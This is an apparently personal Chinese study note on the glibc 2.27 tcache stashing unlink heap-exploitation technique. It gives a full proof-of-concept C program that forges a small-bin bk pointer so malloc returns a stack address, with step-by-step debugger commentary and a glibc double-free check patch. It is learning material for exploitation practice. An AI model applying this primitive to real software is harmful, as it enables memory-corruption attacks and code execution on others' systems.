## Tcache attack stashing unlink attack

值得注意的一个点是：small bin中的空闲块会挂进tcache bin

Example code
```
  1 //gcc -g -no-pie hollk.c -o hollk
  2 //patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk
  3 //patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk
  4 #include <stdio.h>
  5 #include <stdlib.h>
  6 #include <assert.h>
  7 
  8 int main(){
  9     unsigned long stack_var[0x10] = {0};
 10     unsigned long *chunk_lis[0x10] = {0};
 11     unsigned long *target;
 12 
 13     setbuf(stdout, NULL);
 14     
 15     printf("stack_var addr is:%p\n",&stack_var[0]);
 16     printf("chunk_lis addr is:%p\n",&chunk_lis[0]);
 17     printf("target addr is:%p\n",(void*)target);
 18 
 19     stack_var[3] = (unsigned long)(&stack_var[2]);
 20 
 21     for(int i = 0;i < 9;i++){
 22         chunk_lis[i] = (unsigned long*)malloc(0x90);
 23     }
 24 
 25     for(int i = 3;i < 9;i++){
 26         free(chunk_lis[i]);
 27     }
 28     
 29     free(chunk_lis[1]);
 30     free(chunk_lis[0]);
 31     free(chunk_lis[2]);
 32     
 33     malloc(0xa0);
 34     malloc(0x90);
 35     malloc(0x90);
 36     
 37     chunk_lis[2][1] = (unsigned long)stack_var;
 38     calloc(1,0x90);
 39 
 40     target = malloc(0x90);
 41 
 42     printf("target now: %p\n",(void*)target);
 43 
 44     assert(target == &stack_var[2]);
 45     return 0;
 46 }

```

简单的描述一下这个程序的执行流程：首先创建了一个数组stack_var[0x10]，一个指针数组chunk_lis[0x10]，一个指针target。接下来调用setbuf()函数进行初始化。接着调用printf()函数打印stack_var、chunk_lis首地址及target的地址。接下来将stack_var[2]所在地址放在stack_var[3]中。接着循环创建8个size为0xa0大小的chunk，并将八个chunk的malloc指针依序放进chunk_lis[]中。然后根据chunk_lis[]中的堆块malloc指针循环释放6个已创建的chunk。接下来依序释放chunk_lis[1]、chunk_lis[0]、chunk_lis[2]中malloc指针指向的chunk。然后连续创建三个chunk，第一个size为0xb0，第二个size为0xa0，三个size为0xa0。接下来将chunk_lis\[2]\[1]位置中的内容修改成stack_var的起始地址，接着调用calloc()函数申请一个size为0xa0大小的chunk。最后申请一个size为0xa0大小的chunk，并将其malloc指针赋给target变量，并打印target。

运行初始化后，下断点先看一下栈上的几个值

![Alt text](<Screenshot 2023-11-25 at 16.23.58.png>)

然后执行stack_var[3]的赋值操作
```
pwndbg> p/x stack_var[3]
$24 = 0x7fffffffde80
```

执行malloc和free6个块后
![Alt text](<Screenshot 2023-11-25 at 16.30.26.png>)
目前都放到了tcachebin中，但是只有6个

 29     free(chunk_lis[1]);
 30     free(chunk_lis[0]);
 31     free(chunk_lis[2]);

29行 再释放第二个，这个存到了tcachebin中

30和31行 接着释放第一、三个，存放到了unsorted bin中
```
可以看到在释放chunk_lis[1]的时候chunk2作为最后一个进入tcache的chunk填满了整条链表，接下来再继续释放size为0xa0的堆块的话就不会在进入此条单向链表了。由于chunk_lis[0]、chunk_lis[2]中malloc指向的chunk的size都为0xa0，所以超过fastbin max size，所以会进入unsorted bin中，上图可以看到此时chunk1与chunk3已经进入了unsorted bin中。
```
![Alt text](<Screenshot 2023-11-25 at 16.33.46.png>)

接下来我们将断点下在第34行，申请一块size为0xb0大小的chunk，我们在看一下bin中的情况：

![Alt text](<Screenshot 2023-11-25 at 16.35.17.png>)

由于unsorted bin存取机制的原因，如果此时申请一个size为0xb0大小的chunk，unsorted bin中如果没有符合chunk size的空闲块（chunk3、chunk1的size小于0xb0），那么unsorted bin中的空闲块chunk3和chunk1会按照size落在small bin的0xa0链表中.
但是这里又个问题，这个malloc分配的0xb0的块在哪里？看了rax的值0x555555757800，但是没找到堆块！！！

完成两次申请size为0xa0大小的chunk，这样一来由于tcache bin中又满足size为0xa0的空闲块，所以chunk2和chunk4就被重新启用了。那么此时bin中就形成了tcache bin中存在5个空闲块，small bin中存在2个空闲块的情况了。

chunk_lis[2][1] = (unsigned long)stack_var;这条语句是这样执行的，首先chunk_lis[2]的位置就是存放chunk3的malloc指针的位置，那么chunk_lis[2][1]指的就是以chunk3头指针为起始位置，向后第二个地址位宽的位置，即chunk3的bk位置。chunk3_bk中的内容就被修改成了stack_var的头指针

![Alt text](<Screenshot 2023-11-25 at 16.40.38.png>)


![Alt text](<Screenshot 2023-11-25 at 16.45.19.png>)


![Alt text](<Screenshot 2023-11-25 at 16.45.43.png>)


这个时候的bin的情况

![Alt text](<Screenshot 2023-11-25 at 16.51.37.png>)
可以看到smallbins中将stack_var作为chunk3后续释放的块地址链接进来了

由于chunk3是unsorted bin中最后一个chunk，且chunk3的bk被修改成了stack_var的头指针，所以，stack_var会被认为是紧跟着chunk3之后释放的一个chunk：

![Alt text](image-12.png)

那么接下来我们将断点下在第40行，调用calloc函数申请一个size为0xa0大小的chunk：

这里说明一下为什么要使用calloc进行申请chunk，这是因为calloc在申请chunk的时候不会从tcache bin中摘取空闲块，如果这里使用malloc的话就会直接从tcache bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk1
![Alt text](<Screenshot 2023-11-25 at 16.54.24.png>)

重点：在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk3和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个 stack_var(0x7ffffffddf0)开始顺着bk链接到 tcachebin 中 ，在这个过程中只对第一个 chunk3进行了完整性检查，后面的stack_var的检查缺失。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中


接下来我们将断点下在第44行，最后申请一个size为0xa0大小的chunk，并将其malloc指针赋给target变量，并打印target
bin的情况，可以看到，tcachebin末尾的假堆块被分配走了
![Alt text](<Screenshot 2023-11-25 at 16.57.14.png>)
由于stack_var处于tcache链表的最后一个，所以在申请size为0xa0大小的chunk的时候，stack_var就会被重新启用
![Alt text](<Screenshot 2023-11-25 at 16.58.18.png>)


这个方法最重要还是要了解堆分配时候，tcache块和unsorted块还有small bin块会如何调度。

### Tcache Check

```
index 6d7a6a8..f730d7a 100644 (file)
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)
 typedef struct tcache_entry
 {
   struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  struct tcache_perthread_struct *key;
 } tcache_entry;

 /* There is one of these for each thread, which contains the
@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)
 {
   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
   assert (tc_idx < TCACHE_MAX_BINS);
+
+  /* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */
+  e->key = tcache;
+
   e->next = tcache->entries[tc_idx];
   tcache->entries[tc_idx] = e;
   ++(tcache->counts[tc_idx]);
@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)
   assert (tcache->entries[tc_idx] > 0);
   tcache->entries[tc_idx] = e->next;
   --(tcache->counts[tc_idx]);
+  e->key = NULL;
   return (void *) e;
 }

@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)
   {
     size_t tc_idx = csize2tidx (size);

+    /* Check to see if it's already in the tcache.  */
+    tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+    /* This test succeeds on double free.  However, we don't 100%
+       trust it (it also matches random payload data at a 1 in
+       2^<size_t> chance), so verify it's not an unlikely coincidence
+       before aborting.  */
+    if (__glibc_unlikely (e->key == tcache && tcache))
+      {
+       tcache_entry *tmp;
+       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+       for (tmp = tcache->entries[tc_idx];
+            tmp;
+            tmp = tmp->next)
+         if (tmp == e)
+           malloc_printerr ("free(): double free detected in tcache 2");
+       /* If we get here, it was a coincidence.  We've wasted a few
+          cycles, but don't abort.  */
+      }
+
     if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
```
目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的 check。



Ref:

https://hollk.blog.csdn.net/article/details/113604261?spm=1001.2014.3001.5502